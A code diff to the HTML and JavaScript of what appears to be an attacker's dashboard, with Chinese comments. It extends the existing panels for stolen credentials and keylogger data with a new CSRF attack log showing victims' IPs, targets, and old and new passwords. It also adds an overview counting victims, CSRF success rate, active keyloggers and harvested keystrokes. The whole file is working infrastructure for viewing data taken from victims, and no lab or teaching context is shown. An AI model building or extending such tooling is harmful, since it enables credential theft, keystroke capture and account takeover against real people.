@@ -284,12 +284,12 @@
                 <div class="stat-label">Keylogger Records</div>
             </div>
             <div class="stat-card">
-                <div class="stat-number" id="totalKeys">0</div>
-                <div class="stat-label">Total Keystrokes</div>
+                <div class="stat-number" id="csrfCount">0</div>
+                <div class="stat-label">CSRF Attacks</div>
             </div>
             <div class="stat-card">
-                <div class="stat-number" id="serverStatus">●</div>
-                <div class="stat-label">Server Status</div>
+                <div class="stat-number" id="totalKeys">0</div>
+                <div class="stat-label">Total Keystrokes</div>
             </div>
         </div>
 
@@ -306,6 +306,20 @@
                 </div>
             </div>
 
+            <!-- CSRF 攻擊記錄 -->
+            <div class="data-panel">
+                <div class="panel-header">🎯 CSRF ATTACKS</div>
+                <div class="panel-content" id="csrfAttacks">
+                    <div class="loading">
+                        <div class="spinner"></div>
+                        Loading CSRF attacks...
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- 第二排數據面板 -->
+        <div class="data-section">
             <!-- Keylogger 數據 -->
             <div class="data-panel">
                 <div class="panel-header">⌨️ KEYLOGGER DATA</div>
@@ -313,6 +327,17 @@
                     <div class="loading">
                         <div class="spinner"></div>
                         Loading keylogger data...
+                    </div>
+                </div>
+            </div>
+
+            <!-- 攻擊總覽 -->
+            <div class="data-panel">
+                <div class="panel-header">📊 ATTACK OVERVIEW</div>
+                <div class="panel-content" id="attackOverview">
+                    <div class="loading">
+                        <div class="spinner"></div>
+                        Loading attack overview...
                     </div>
                 </div>
             </div>
@@ -348,28 +373,32 @@
                 // 更新統計卡片
                 document.getElementById('credsCount').textContent = stats.creds_count;
                 document.getElementById('keyloggerCount').textContent = stats.keylogger_count;
+                document.getElementById('csrfCount').textContent = stats.csrf_count;
                 document.getElementById('totalKeys').textContent = stats.total_keys;
-                document.getElementById('serverStatus').textContent = '●';
-                document.getElementById('serverStatus').className = 'stat-number status-online';
 
                 // 獲取竊取的帳密
                 const credsResponse = await fetch('/api/stolen_creds');
                 const credsData = await credsResponse.json();
                 updateStolenCreds(credsData.data);
 
+                // 獲取 CSRF 攻擊記錄
+                const csrfResponse = await fetch('/api/csrf_attacks');
+                const csrfData = await csrfResponse.json();
+                updateCsrfAttacks(csrfData.data);
+
                 // 獲取 keylogger 數據
                 const keyloggerResponse = await fetch('/api/keylogger_data');
                 const keyloggerData = await keyloggerResponse.json();
                 updateKeyloggerData(keyloggerData.data);
+
+                // 更新攻擊總覽
+                updateAttackOverview(stats);
 
                 // 顯示更新指示器
                 showUpdateIndicator();
 
             } catch (error) {
                 console.error('Failed to update data:', error);
-                document.getElementById('serverStatus').textContent = '●';
-                document.getElementById('serverStatus').className = 'stat-number';
-                document.getElementById('serverStatus').style.color = '#ff0040';
             }
         }
 
@@ -400,6 +429,27 @@
             `).join('');
         }
 
+        // 更新 CSRF 攻擊顯示
+        function updateCsrfAttacks(data) {
+            const container = document.getElementById('csrfAttacks');
+            
+            if (data.length === 0) {
+                container.innerHTML = '<div class="loading">🎯 No CSRF attacks recorded yet</div>';
+                return;
+            }
+
+            container.innerHTML = data.map(item => `
+                <div class="data-item">
+                    <div class="data-timestamp">⏰ ${item.timestamp} | 🌐 ${item.ip}</div>
+                    <div class="data-content">
+                        <strong>🎯 Target:</strong> <span style="color: #ff0040">${item.target}</span><br>
+                        <strong>🔓 Old Password:</strong> <span style="color: #888">${item.old_password}</span><br>
+                        <strong>🔒 New Password:</strong> <span style="color: #ff0040">${item.new_password}</span>
+                    </div>
+                </div>
+            `).join('');
+        }
+
         // 更新 keylogger 數據顯示
         function updateKeyloggerData(data) {
             const container = document.getElementById('keyloggerData');
@@ -417,6 +467,26 @@
                     </div>
                 </div>
             `).join('');
+        }
+
+        // 更新攻擊總覽
+        function updateAttackOverview(stats) {
+            const container = document.getElementById('attackOverview');
+            
+            const successRate = stats.csrf_count > 0 ? '100%' : '0%';
+            const totalAttacks = stats.creds_count + stats.csrf_count;
+            
+            container.innerHTML = `
+                <div class="data-item">
+                    <div class="data-content">
+                        <strong>📊 Attack Statistics:</strong><br>
+                        Total Victims: <span style="color: #ff0040">${totalAttacks}</span><br>
+                        CSRF Success Rate: <span style="color: #00ff41">${successRate}</span><br>
+                        Active Keyloggers: <span style="color: #00ff41">${stats.keylogger_count > 0 ? 'YES' : 'NO'}</span><br>
+                        Data Harvested: <span style="color: #00ff41">${stats.total_keys} keystrokes</span>
+                    </div>
+                </div>
+            `;
         }
 
         // HTML 轉義
